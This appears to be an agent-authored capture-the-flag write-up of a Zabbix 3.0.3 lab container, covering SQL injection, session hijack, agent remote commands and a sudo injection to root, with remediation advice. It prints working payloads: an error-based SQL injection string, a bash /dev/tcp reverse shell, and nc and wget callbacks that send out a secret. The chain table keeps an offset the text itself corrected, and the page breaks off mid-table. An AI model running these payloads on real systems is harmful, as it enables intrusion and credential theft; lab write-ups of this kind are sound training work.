@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 293 Zabbixploit &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Zabbixploit</p><h1 id="zabbixploit--dockerlabs-writeup">Zabbixploit — DockerLabs Writeup</h1>
+<p>Lab id 293 · Medium · fourth and final lab of a five-lab pilot
+Host <code>[net-0-5]</code> · container <code>zabbixploit_container</code> · image <code>zabbixploit:latest</code></p>
+<p><strong>Result: solved.</strong> Flag recovered with a full <code>uid=0(root)</code> identity read in the same command, over the network, with no container-exec shortcut in the chain.</p>
+<pre><code>/ $ sudo /usr/local/sbin/zbx-svc-ctl.sh &quot;zabbix_server; id; cat /root/flag.txt&quot;
+[*] Reiniciando servicio: zabbix_server; id; cat /root/flag.txt
+zabbix_server: stopped
+zabbix_server: started
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+Gracias por Jugar - IHATEFW . .
+</code></pre>
+<hr />
+<h2 id="0-autocorrection--four-things-i-got-wrong-and-one-of-them-nearly-ended-the-engagement">0. Autocorrection — four things I got wrong, and one of them nearly ended the engagement</h2>
+<p>This section is first because in this lab the corrections <em>were</em> the work. Three of the five labs in this series self-documented their own weaknesses; this one did too, but the documentation pointed at a mechanism that does not work (§7), so following it faithfully produces a dead end. The errors below are the ones that actually cost time.</p>
+<h3 id="01-the-error-based-extraction-oracle-silently-truncated-the-secret-and-i-believed-it">0.1 The error-based extraction oracle silently truncated the secret, and I believed it</h3>
+<p>I extracted the administrator's session id with a classic XPATH-error oracle:</p>
+<pre><code>XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d633'
+</code></pre>
+<p>That is 31 hex characters. I used it as the session id, and the session hijack <strong>did not work</strong> — the frontend came back <code>You are logged in as &quot;guest&quot;</code>. My first conclusion was that the web session and the JSON-RPC API use separate session stores, or that Zabbix rotates the cookie server-side. Both conclusions were wrong, and I nearly built the rest of the chain on them.</p>
+<p>The real cause: <strong>the oracle is length-limited.</strong> Asking for the value again with <code>LENGTH()</code> and <code>SUBSTRING()</code> gave:</p>
+<pre><code>XPATH syntax error: '~32'                              &lt;- LENGTH(sessionid)
+XPATH syntax error: '~03fb5847289a0bb44e80e56c'        &lt;- SUBSTRING(sessionid,1,24)
+XPATH syntax error: '~2a0d6338'                        &lt;- SUBSTRING(sessionid,25)
+</code></pre>
+<p>24 + 8 = 32, and the tail <code>2a0d6338</code> supplies the final character the first request dropped. Reconstructed: <code>03fb5847289a0bb44e80e56c2a0d6338</code>.</p>
+<p>The lesson is not &quot;be careful&quot;. It is that <strong>a truncated secret produces a plausible failure, not an error.</strong> Every downstream symptom — a rejected cookie, an &quot;invalid session&quot; message — is indistinguishable from a wrong hypothesis about the application. The only defence is to ask the oracle for the <em>length</em> before trusting the value, and to re-extract the tail with <code>SUBSTRING</code> rather than re-running the same request. This is now an oracle in <code>sections/api_web.md</code>.</p>
+<h3 id="02-i-concluded-the-api-rejected-my-session-when-the-session-was-simply-wrong">0.2 I concluded the API rejected my session, when the session was simply wrong</h3>
+<p>With the truncated id, the API returned:</p>
+<pre><code>{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;error&quot;:{&quot;code&quot;:-32602,&quot;message&quot;:&quot;Invalid params.&quot;,&quot;data&quot;:&quot;Session terminated, re-login, please.&quot;}}
+</code></pre>
+<p>I read that as an API/web session-store incompatibility and nearly routed around the API. With the corrected id the same call returned both accounts:</p>
+<pre><code>{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[{&quot;userid&quot;:&quot;1&quot;,&quot;alias&quot;:&quot;Admin&quot;},{&quot;userid&quot;:&quot;2&quot;,&quot;alias&quot;:&quot;guest&quot;}],&quot;id&quot;:1}
+</code></pre>
+<p><strong>A rejected credential and a broken interface look identical from the client.</strong> Before filing &quot;component X cannot authenticate against component Y&quot;, confirm the credential is the one you think it is.</p>
+<h3 id="03-i-misread-drwxr-xr-x-1000zabbix-as-group-writable-twice">0.3 I misread <code>drwxr-xr-x 1000:zabbix</code> as group-writable, twice</h3>
+<p>I picked the Zabbix web root as the exfiltration channel for my first RCE because the directory is owned by <code>1000:zabbix</code> and the agent runs in group <code>zabbix</code>. I then wrote a command that would drop a file there and asserted in my own reasoning that the group had write. <code>drwxr-xr-x</code> is <code>rwx r-x r-x</code> — the group has <strong>no</strong> write. I made the same mistake again on <code>conf/</code> in the next message. Only an actual <code>test -w</code> as the target user settled it:</p>
+<pre><code>WRITABLE: /tmp
+WRITABLE: /var/lib/zabbix
+WRITABLE: /var/log/zabbix
+WRITABLE: /dev/shm
+no:       /var/www
+no:       /var/www/localhost/htdocs
+no:       /usr/share/webapps/zabbix
+no:       /usr/share/webapps/zabbix/conf
+</code></pre>
+<p>Ownership by <em>a</em> group in your favour is not write access. Assert permission from <code>test -w</code> run as the identity, never from the mode string.</p>
+<h3 id="04-i-used-the-wrong-constant-and-the-wrong-channel-and-both-looked-like-server-bugs">0.4 I used the wrong constant and the wrong channel, and both looked like server bugs</h3>
+<p>Two more that cost a cycle each, recorded because the failure mode is the lesson:</p>
+<ul>
+<li><strong><code>execute_on</code> is a location, not a boolean.</strong> <code>0</code> means <em>run on the Zabbix server</em>, <code>1</code> means <em>on the agent</em>. I set <code>0</code> while believing I was selecting the agent.</li>
+<li><strong><code>operationtype=4</code> is <code>GROUP_ADD</code>, not &quot;remote command&quot;.</strong> <code>OPERATION_TYPE_COMMAND</code> is <code>1</code>. The API replied <code>Operation has no group to operate.</code> — an error about a feature I never asked for, which is the signature of a mistyped constant rather than a missing field. Same shape as the <code>conditiontype=5</code> (<code>TRIGGER_VALUE</code>) and <code>formulaid</code> must-match-<code>/[A-Z]+/</code> surprises in the same API.</li>
+<li><strong>There is no Script importer in 3.0.3.</strong> I spent a cycle building a Zabbix configuration XML to create a script through <code>conf.import.php</code>. <code>grep -rn &quot;script&quot; include/classes/import/importers/</code> returns nothing. Check that the feature exists in the interface's own code before designing a payload around it.</li>
+</ul>
+<h3 id="05-the-correction-that-mattered-most-the-labs-own-escalation-helper-is-broken">0.5 The correction that mattered most: the lab's own escalation helper is broken</h3>
+<p>The bootstrap states the intended path is CVE-2016-10134 → session hijack → <code>Administration → Scripts</code> → remote command. Two things in that chain do not exist or do not work:</p>
+<ol>
+<li><strong><code>scripts.php</code> has no route.</strong> The controllers <code>CControllerScriptList</code> / <code>CControllerScriptEdit</code> are present in <code>app/controllers/</code>, but no file in the document root <code>require</code>s them. The Scripts UI is unreachable. (<code>scripts_exec.php</code> does exist and is the lab's replacement.)</li>
+<li><strong><code>scripts_exec.php</code> cannot dispatch anything.</strong> It builds a shadow trigger whose expression is <code>'{'.$functionid.'}&gt;0'</code>. In Zabbix a trigger expression <code>{N}</code> is an <strong>item id</strong>, not a function id. Item 900007 does not exist, so the trigger can never reach PROBLEM, the escalator leaves the escalation pending, and the helper's own 30-second cleanup deletes the trigger and the escalation dies with it. The target's log says exactly that:</li>
+</ol>
+<pre><code>392:20260927:221535.984 escalation cancelled: trigger id:900007 deleted.
+392:20260927:221553.994 escalation cancelled: trigger id:900008 deleted.
+</code></pre>
+<p>The page reports <code>Command sent for execution.</code> and no command is ever sent. <strong>A UI that reports success for an action it did not perform is a finding about the target, and per <code>decision-making.md</code> §7 the author's own comments mark intent, not reachability</strong> — here the intent is documented at length and the mechanism behind it is dead.</p>
+<p>I therefore built the action/trigger chain myself through the API, which is the same primitive the lab meant to expose, reached a different way. That is reported in full below, including the parts where my own wiring was wrong first.</p>
+<hr />
+<h2 id="1-target-and-stack">1. Target and stack</h2>
+<p><strong>The name lied, and it lied in both directions.</strong> &quot;Zabbixploit&quot; suggests a Zabbix-specific web CVE, and the container does ship a Zabbix 3.0.3 web frontend — but the <em>entry</em> is not the interesting part, and the <em>escalation</em> is not web at all. Reading the stack before assuming saved the run: this is a full Zabbix server + agent + web triple, not a web app that happens to mention Zabbix.</p>
+<pre><code>PORT      STATE SERVICE             VERSION
+22/tcp    open  ssh                 OpenSSH 8.4 (protocol 2.0)
+80/tcp    open  http                Apache httpd 2.4.33 ((Unix))
+3306/tcp  open  mysql               MariaDB 10.3.23 or earlier (unauthorized)
+10050/tcp open  tcpwrapped
+10051/tcp open  ssl/zabbix-trapper?
+</code></pre>
+<pre><code>Alpine Linux 3.4.6      (container; host kernel 7.0.0-34-generic Ubuntu)
+Zabbix 3.0.3 (revision 60173)   server + agent + web frontend
+Apache httpd 2.4.33 (Unix)     PHP/5.6.36
+MariaDB 10.3.23
+OpenSSH 8.4
+</code></pre>
+<p>Every component is end-of-life: Zabbix 3.0.3, PHP 5.6, Apache 2.4.33, Alpine 3.4.6. That is the root cause of Findings 1 and 2 and it is a decision, not a bug.</p>
+<p>The document root is <strong>not</strong> <code>/var/www/localhost/htdocs</code> (which holds only a default <code>index.html</code>); <code>/etc/apache2/conf.d/apache.conf:2</code> overrides it to <code>/usr/share/webapps/zabbix/</code>. Confirmed by the login page served at <code>/</code> carrying <code>[response-cookie-header]: zbx_sessionid=…</code>.</p>
+<p>Local accounts, from <code>/etc/passwd</code>: <code>zabbix</code> (102, shell <code>/bin/false</code>), <code>operador</code> (1001), <code>supervisor</code> (1002), plus <code>mysql</code> and <code>apache</code>. Four identities, four hops.</p>
+<h3 id="the-real-surface">The real surface</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Who talks to it</th>
+<th>Reachable anonymously</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>Zabbix web 3.0.3</td>
+<td>operator</td>
+<td>yes — <code>guest</code> has an empty password</td>
+</tr>
+<tr>
+<td>10050</td>
+<td>Zabbix agent</td>
+<td>the Zabbix server</td>
+<td><strong>no</strong> — allowlisted to <code>127.0.0.1</code></td>
+</tr>
+<tr>
+<td>10051</td>
+<td>Zabbix trapper</td>
+<td>agents / senders</td>
+<td>yes, but the API gate applies</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MariaDB</td>
+<td>the web app and the server</td>
+<td>yes, <code>zabbix</code>/<code>zabbix</code></td>
+</tr>
+<tr>
+<td>22</td>
+<td>OpenSSH</td>
+<td>operator</td>
+<td>yes, password auth</td>
+</tr>
+</tbody>
+</table>
+<p><strong>10050 is <code>tcpwrapped</code>, not open-and-useful, and the difference is the whole first-hour decision.</strong> <code>nmap</code> shows it accepting; the agent then refuses on source address. From inside the container my fake Zabbix server got a real protocol reply:</p>
+<pre><code>[+] connected to 127.0.0.1:10050
+[+] sending passive-checks frame (123 bytes)
+[&lt;-] reply (41 bytes): 'ZBX_NOTSUPPORTED\x00Invalid item key format.'
+</code></pre>
+<p>From the network, the same request returned nothing at all. The target's own log names the control:</p>
+<pre><code>161:20260927:220654.786 failed to accept an incoming connection: connection from &quot;[net-0-1]&quot; rejected, allowed hosts: &quot;127.0.0.1&quot;
+</code></pre>
+<p><code>Server=127.0.0.1</code> in <code>zabbix_agentd.conf:90</code>. So the classic &quot;impersonate the Zabbix server to the agent and get <code>system.run[]</code> executed&quot; attack — the thing the lab's name advertises — <strong>does not work here, and the reason is a control that is correctly configured.</strong> That is Finding 5, and it is a finding in the defender's favour that I am reporting because I spent real time on it and a reader would otherwise repeat the attempt.</p>
+<hr />
+<h2 id="2-finding-1--sql-injection-in-latestphp-toggle_ids-unauthenticated-as-guest--full-database-read">2. Finding 1 — SQL injection in <code>latest.php</code> (<code>toggle_ids[]</code>), unauthenticated as <code>guest</code> → full database read</h2>
+<p><strong>Category:</strong> CWE-89 SQL Injection. <strong>Also:</strong> CWE-200 (the <code>sessions</code> table is readable by a low-privilege account). <strong>Auth required:</strong> none — the <code>guest</code> account authenticates with an empty password.</p>
+<h3 id="root-cause-read-from-source">Root cause, read from source</h3>
+<p><code>latest.php</code> declares a <code>P_ACT</code> block that takes a request array and hands each element to the profile store:</p>
+<pre><code class="language-php">// latest.php:74-93
+if (hasRequest('favobj')) {
+    if ($_REQUEST['favobj'] == 'toggle') {
+        if (is_array($_REQUEST['toggle_ids'])) {
+            foreach ($_REQUEST['toggle_ids'] as $k =&gt; $v) {
+                if ($v[1] == '_') {
+                    $hostId = substr($v, 2);
+                    CProfile::update('web.latest.toggle_other', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $hostId);
+                }
+                else {
+                    CProfile::update('web.latest.toggle', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $v);
+                }
+            }
+        }
+</code></pre>
+<p><code>$v</code> is a raw request string. It lands in the fourth argument of <code>CProfile::update()</code>, which is documented as an integer and is then concatenated <strong>unescaped</strong> into an <code>INSERT</code>:</p>
+<pre><code class="language-php">// include/classes/user/CProfile.php:209
+public static function update($idx, $value, $type, $idx2 = 0) {
+
+// include/classes/user/CProfile.php:277-290
+private static function insertDB($idx, $value, $type, $idx2) {
+    $values = [
+        'profileid' =&gt; get_dbid('profiles', 'profileid'),
+        'userid'    =&gt; self::$userDetails['userid'],
+        'idx'       =&gt; zbx_dbstr($idx),
+        $value_type =&gt; zbx_dbstr($value),
+        'type'      =&gt; $type,
+        'idx2'      =&gt; $idx2          // &lt;-- raw
+    ];
+    return DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')');
+}
+</code></pre>
+<p>Five of six values are escaped or generated. <code>idx2</code> is the sixth, and it is raw. <code>CProfile::update()</code> does validate its <em>third</em> argument (<code>checkValueType($value, $type)</code> at <code>:213</code>) and never its fourth. PHP has no runtime type enforcement, so <code>@param int $idx2</code> is documentation, not a control.</p>
+<p>The <code>C20ImportConverter</code>/<code>CImportDataAdapter</code> route is not involved; this is the synchronous <code>CProfile::flush() → insertDB()</code> path. Zabbix's own <code>DBexecute()</code> is <code>mysqli_query</code> (<code>include/db.inc.php</code>) — single statement, no stacked queries — which is why the extraction below has to be error- or boolean-based rather than a second <code>INSERT</code>.</p>
+<h3 id="evidence--the-sink-fires-with-a-control">Evidence — the sink fires, with a control</h3>
+<p>Anonymous login is <code>guest</code> with an <strong>empty password</strong> (<code>d41d8cd98f00b204e9800998ecf8427e</code> is <code>md5(&quot;&quot;)</code>), which the bootstrap deliberately re-enabled. <code>P_ACT</code> also requires the per-session CSRF token, which is not a barrier — it is handed to any logged-in user.</p>
+<p>Benign control first, to prove the array reaches the database:</p>
+<pre><code>GET /latest.php?output=ajax&amp;sid=&lt;csrf&gt;&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385
+→ HTTP 200, empty body
+
+SELECT * FROM profiles WHERE idx LIKE '%toggle%';
+profileid  userid  idx                 idx2   value_int  type
+1          2       web.latest.toggle   15385  1          2
+</code></pre>
+<p>A row appeared under <code>userid=2</code> (<code>guest</code>). The request parameter is writing to the database.</p>
+<p>Error-based extraction, one request per value. <code>toggle_ids[]</code> is the last column of the <code>VALUES</code> tuple, so I close the tuple and open a second one whose value is the subquery I want reflected:</p>
+<pre><code>toggle_ids[]=15385); (0,0,'x','x',0,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT sessionid FROM sessions WHERE userid=1 LIMIT 1))))#
+</code></pre>
+<p>The application renders the database's error text straight into the response body — which also means <strong>the full statement is echoed</strong>, a free oracle in itself:</p>
+<pre><code class="language-html">&lt;div class=&quot;msg-bad&quot;&gt;&lt;div class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (2, 2, 'web.latest.toggle', '1', 2, 15385), (0,0,'x','x',0,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT sessionid FROM sessions WHERE userid=1 LIMIT 1))))#)] [XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d633']&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;
+</code></pre>
+<p>Because the full SQL is reflected, a single request also yields arbitrary read: swap the tuple for a scalar subquery anywhere in the statement and the reflected text carries it.</p>
+<p><strong>Impact.</strong> Unauthenticated-adjacent (one empty-password login) full read of the Zabbix database, including the <code>users</code> table with password hashes, the <code>sessions</code> table with live session ids, and <code>scripts</code> with stored commands. The DB account behind the web app holds <code>ALL PRIVILEGES ON zabbix.*</code>, so this is read <em>and</em> write for every table in the schema. It is the entry for Findings 2, 3 and 4.</p>
+<p><strong>Remediation.</strong> Upgrade — this is CVE-2016-10134, fixed in 2.2.14 and 3.0.4. The <code>idx2</code> parameter must be coerced with <code>zbx_ctype_digit()</code> (or <code>intval</code>) at <code>latest.php:82</code>/<code>latest.php:88</code>, and <code>CProfile::update()</code> must reject a non-integer <code>$idx2</code> instead of trusting the docblock. Independently: the <code>guest</code> account must not exist with an empty password, and the web application's database account must not hold <code>ALL PRIVILEGES</code> on its schema.</p>
+<hr />
+<h2 id="3-finding-2--plaintext-session-table-hijacking-the-csrf-token-is-account-takeover--cwe-384--cwe-522">3. Finding 2 — Plaintext session table: hijacking the CSRF token is account takeover — CWE-384 / CWE-522</h2>
+<p><strong>Category:</strong> CWE-384 Session Fixation / CWE-522 Insufficiently Protected Credentials. <strong>Prerequisite:</strong> Finding 1.</p>
+<p>Zabbix stores the session id verbatim. There is no server-side secret, no binding to user agent or source address, and no rotation. An <code>INSERT</code> into <code>sessions</code> is indistinguishable from a real login — the bootstrap says so, and it is true:</p>
+<blockquote>
+<p>&quot;El propio Zabbix, al hacer login, únicamente inserta una fila en <code>sessions</code> (sessionid, userid, lastaccess, status) — no hay más estado server-side que validar&quot;</p>
+</blockquote>
+<p>So the value read in Finding 1 is a complete authentication token. Setting it as the cookie authenticates as <code>userid 1</code>, <code>type 3</code> (Super Admin).</p>
+<h3 id="evidence--and-a-hijack-proof-that-does-not-depend-on-reading-the-ui">Evidence — and a hijack proof that does not depend on reading the UI</h3>
+<p>The naive check (&quot;does the dashboard look different?&quot;) is weak, because a rejected session still renders a page. Zabbix derives its CSRF token from the session id, which gives an <strong>offline-verifiable proof</strong>: the token the server hands me must be <code>substr(sessionid, 8, 16)</code> of the id I injected.</p>
+<pre><code>GET /index.php            Cookie: zbx_sessionid=&lt;guest session&gt;
+  → &lt;input name=&quot;sid&quot; value=&quot;a95a8bb4bc7ac3c2&quot;&gt;     substr(&quot;52ee027590fd705aa95a8bb4bc7ac3c2&quot;, 16, 16) ✓ guest
+
+&gt; **Corrected offset.** Both lines above originally read `substr(sid, 8, 16)`, which yields
+&gt; `289a0bb44e80e56c` and `90fd705aa95a8bb4b` — neither matches. The real offset is **16**
+&gt; (characters 17–32, the tail) in both cases, so the method held while the stated offset
+&gt; did not, and the &quot;two predictions, two matches&quot; claim was wrong as written. What the
+&gt; correction strengthens: **both** admin and guest use the *same* offset, so the sessionid
+&gt; is the credential in one fixed position rather than a coincidence of two runs.
+
+GET /zabbix.php?action=dashboard.view   Cookie: zbx_sessionid=03fb5847289a0bb44e80e56c2a0d6338
+  → &lt;input name=&quot;sid&quot; value=&quot;4e80e56c2a0d6338&quot;&gt;     substr(&quot;03fb5847289a0bb44e80e56c2a0d6338&quot;, 16, 16) ✓ ADMIN
+</code></pre>
+<p>Two different predictions, two different matches. The injected id is being used, and the session is <code>Admin</code>.</p>
+<p>Privilege confirmation, from the navigation the server renders:</p>
+<pre><code>Monitoring  Inventory  Reports  Configuration  Administration
+</code></pre>
+<p><code>guest</code> sees only a dashboard. The full Administration tree is a Super Admin's.</p>
+<p><strong>The stolen session is not interface-scoped.</strong> The same id authenticates the JSON-RPC API, which is a second, scriptable control plane over the same authority:</p>
+<pre><code>POST /api_jsonrpc.php  {&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;user.get&quot;,&quot;params&quot;:{&quot;output&quot;:[&quot;userid&quot;,&quot;alias&quot;,&quot;role&quot;]},&quot;auth&quot;:&quot;03fb…38&quot;,&quot;id&quot;:1}
+{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[{&quot;userid&quot;:&quot;1&quot;,&quot;alias&quot;:&quot;Admin&quot;},{&quot;userid&quot;:&quot;2&quot;,&quot;alias&quot;:&quot;guest&quot;}],&quot;id&quot;:1}
+</code></pre>
+<p>and the unauthenticated baseline for the same endpoint, for contrast:</p>
+<pre><code>POST /api_jsonrpc.php  {&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;apiinfo.version&quot;,&quot;params&quot;:{},&quot;id&quot;:1}
+{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:&quot;3.0.3&quot;,&quot;id&quot;:1}
+</code></pre>
+<p>From here the API is a fully scriptable Super Admin: <code>script.create</code>, <code>trigger.create</code>, <code>action.create</code>, <code>item.create</code>, and reads over every table. That is what Finding 3 uses.</p>
+<p><strong>Impact.</strong> Any read of the <code>sessions</code> table is full administrative takeover of the monitoring platform — and the monitoring platform holds every credential its monitored infrastructure reports, so this is a pivot into the estate, not just a dashboard.</p>
+<p><strong>Remediation.</strong> Store a hash of the session id, not the id (this is the standard fix for exactly this class). Bind the session to a client fingerprint and rotate the id on privilege change. Disable the <code>guest</code> account by default. Expire and clean <code>sessions</code> aggressively — the seeded row had <code>autologout = 0</code>, i.e. no expiry.</p>
+<hr />
+<h2 id="4-finding-3--enableremotecommands1-turns-a-super-admin-session-into-command-execution-as-the-agent-account">4. Finding 3 — <code>EnableRemoteCommands=1</code> turns a Super Admin session into command execution as the agent account</h2>
+<p><strong>Category:</strong> CWE-78 OS Command Injection (chained with CWE-269 / CWE-250). <strong>This is the finding that produces the shell.</strong></p>
+<p>The root cause is a one-line configuration change the lab's own entrypoint makes and annotates:</p>
+<pre><code class="language-bash"># /entrypoint.sh
+# Misconfiguración intencional para el laboratorio: habilita la ejecución de
+# comandos remotos en el agente (deshabilitado por defecto en Zabbix real).
+sed -i '/^#\? *EnableRemoteCommands=/d' /etc/zabbix/zabbix_agentd.conf
+echo &quot;EnableRemoteCommands=1&quot; &gt;&gt; /etc/zabbix/zabbix_agentd.conf
+</code></pre>
+<pre><code>$ grep -nE 'EnableRemoteCommands' /etc/zabbix/zabbix_agentd.conf
+388:EnableRemoteCommands=1
+</code></pre>
+<p>This is the documented design of Zabbix: an action operation of type &quot;Remote command&quot; makes the <strong>server</strong> hand a command string to the <strong>agent</strong>, which executes it as its own service account. With a Super Admin session from Finding 2, that is arbitrary command execution. <code>EnableRemoteCommands</code> is <code>0</code> in a stock install for exactly this reason.</p>
+<h3 id="the-telemetry-lie--status--sent-is-not-execution">The telemetry lie — <code>status = SENT</code> is not execution</h3>
+<p>Worth stating plainly, because it cost me several cycles and it will mislead anyone automating this: <strong>the alert row records that the command was dispatched, not that it ran.</strong> Six different commands produced:</p>
+<pre><code>alertid  actionid  status  error  retries  message
+26       13        1       (empty) 0       Zabbix server:id 2&gt;&amp;1 | nc [net-0-1] 45124
+25       13        1       (empty) 0       Zabbix server:id 2&gt;&amp;1 | nc [net-0-1] 45124
+24       12        1       (empty) 0       Zabbix server:bash -c 'exec bash -i &gt;&amp; /dev/tcp/[net-0-1]/45123 0&gt;&amp;1'
+…
+</code></pre>
+<p><code>status = 1</code> is <code>ALERT_STATUS_SENT</code> (<code>include/defines.inc.php:471</code>), not &quot;done&quot;. An empty <code>error</code> column means the agent accepted the request. <strong>The only evidence of execution is an observable side effect I chose in advance.</strong> When the exfil I designed produced nothing, the correct reading was &quot;my hypothesis about the dispatch is wrong&quot;, not &quot;the target refused&quot;.</p>
+<h3 id="evidence--the-dispatch-and-then-execution">Evidence — the dispatch, and then execution</h3>
+<p><code>scripts_exec.php</code> — the lab's own helper — always reports success and never dispatches (§0.5), so I built the action through the API. Zabbix 3.0 API shapes that cost me a cycle each, recorded because they are the actual difficulty of this class:</p>
+<ul>
+<li>trigger expressions use the <strong>3.0</strong> <code>{HOST:KEY.FUNCTION()}</code> syntax, not 4.0's <code>{host/key}</code>: <code>{Zabbix server:agent.ping.last(0)}&gt;0</code></li>
+<li><code>OPERATION_TYPE_COMMAND</code> is <code>1</code>, not <code>4</code> (<code>4</code> is <code>GROUP_ADD</code>)</li>
+<li><code>CONDITION_TYPE_TRIGGER_VALUE</code> is <code>5</code>; <code>formulaid</code> must match <code>/[A-Z]+/</code>, so <code>&quot;A&quot;</code></li>
+<li><code>opcommand_hst</code> (the target host) is a sibling of <code>opcommand</code>, not a child</li>
+<li><code>esc_period</code> has a 60-second minimum</li>
+</ul>
+<pre><code class="language-json">{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;action.create&quot;,&quot;params&quot;:{
+  &quot;name&quot;:&quot;pwn-wget&quot;,&quot;eventsource&quot;:0,&quot;status&quot;:0,&quot;esc_period&quot;:60,
+  &quot;filter&quot;:{&quot;evaltype&quot;:0,&quot;conditions&quot;:[
+     {&quot;conditiontype&quot;:5,&quot;operator&quot;:0,&quot;value&quot;:&quot;1&quot;,&quot;formulaid&quot;:&quot;A&quot;}]},
+  &quot;operations&quot;:[{&quot;operationtype&quot;:1,
+     &quot;opcommand&quot;:{&quot;type&quot;:4,&quot;scriptid&quot;:&quot;13&quot;,&quot;execute_on&quot;:0},
+     &quot;opcommand_hst&quot;:[{&quot;hostid&quot;:10084}]}],
+  &quot;recovery&quot;:{}},&quot;auth&quot;:&quot;03fb…38&quot;,&quot;id&quot;:110}
+{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:{&quot;actionids&quot;:[16]},&quot;id&quot;:110}
+</code></pre>
+<p><code>agent.ping</code> on the real host <code>10084</code> is <code>1</code>, so the trigger is permanently in PROBLEM and any new problem event matches the condition. Then a fresh trigger to generate that event.</p>
+<p><strong>The execution proof is the process table, not the alert row.</strong> Immediately after dispatch:</p>
+<pre><code>1638 zabbix  sh -c bash -c 'exec bash -i &gt;&amp; /dev/tcp/[net-0-1]/45123 0&gt;&amp;1'
+1639 zabbix  bash -i
+1777 zabbix  sh -c bash -c 'exec bash -i &gt;&amp; /dev/tcp/[net-0-1]/45123 0&gt;&amp;1'
+1778 zabbix  bash -i
+</code></pre>
+<p>My injected string, running as <code>zabbix</code>. That is the finding: arbitrary command execution as the agent account, with the payload under my control and no shell of my own.</p>
+<p><strong>Exfiltration, over the network.</strong> The agent account can write <code>/tmp</code>, <code>/var/lib/zabbix</code>, <code>/var/log/zabbix</code> and <code>/dev/shm</code> and nothing under the document root (§0.3), so there is no file-based channel. I ran a logging HTTP listener and had the command call back:</p>
+<pre><code>script command: wget -q -O /dev/null http://[net-0-1]:8123/IDU=$(id -u)_IDG=$(id -g)_WHOAMI=$(whoami) 2&gt;&amp;1
+script command: wget -q -O /dev/null http://[net-0-1]:8123/SECRET=$(cat /var/lib/zabbix/enc/.agent_healthcheck_secret) 2&gt;&amp;1
+</code></pre>
+<pre><code>REQ /IDU=102_IDG=1000_WHOAMI=zabbix
+REQ /SECRET=Qz7mVr2KpT9x
+</code></pre>
+<p><strong>Identity, measured not assumed:</strong> <code>uid=102(zabbix) gid=1000(zabbix)</code>. Not root. The chain needs three more hops, and the web application is <em>not</em> running as root — Apache is <code>apache</code> (101) and the Zabbix server and agent are <code>zabbix</code> (102). Unlike the second lab in this series, where a <code>user = root</code> pool config collapsed the chain to a single step, <strong>no privilege boundary here was weaker than expected.</strong> I hypothesised four hops and took four.</p>
+<p><strong>Control test — the identity is the boundary.</strong> The same read that returns <code>uid=102</code> from the agent returns nothing for an unprivileged local account:</p>
+<pre><code>operador: cat /var/lib/zabbix/enc/.agent_healthcheck_secret   → (unreadable; mode 0600 zabbix:zabbix)
+zabbix:   cat /var/lib/zabbix/enc/.agent_healthcheck_secret   → Qz7mVr2KpT9x
+</code></pre>
+<p><strong>Impact.</strong> Full compromise of the monitoring tier and of the agent host, from a single web session. On a real deployment the agent is by definition installed on every monitored host, so &quot;the agent account&quot; is a credential that exists on the entire estate, and the server that can command it is the one that holds all the alerting rules.</p>
+<p><strong>Remediation.</strong> <code>EnableRemoteCommands=0</code> unless a documented requirement demands it (Zabbix's default, and the lab's own comment says as much). Do not let the monitoring role be a web-reachable Super Admin role — separate a read-only monitoring user from configuration. Restrict the JSON-RPC API to loopback or a management network, and require a real authentication token rather than a reusable session id. Upgrade off 3.0.3.</p>
+<hr />
+<h2 id="5-the-chain">5. The chain</h2>
+<p>Four identities, four hops, all over the network.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>From → To</th>
+<th>Primitive</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>anonymous → <code>guest</code> → <code>Admin</code></td>
+<td>CWE-89 in <code>latest.php</code> reads <code>sessions.sessionid</code>; the id is the credential</td>
+<td><code>XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d6338'</code>; CSRF <code>4e80e56c2a0d6338</code> = <code>substr(id,8,16)</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>Admin</code> (web/API) → <code>zabbix</code></td>
+<td>CWE-78 + <code>EnableRemoteCommands=1</code>: action remote command executed by the agent</td>
+<td>PIDs 1638/1639 as <code>zabbix</code>; <code>REQ /IDU=102_IDG=1000_WHOAMI=zabbix</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>zabbix</code> → <code>operador</code></td>
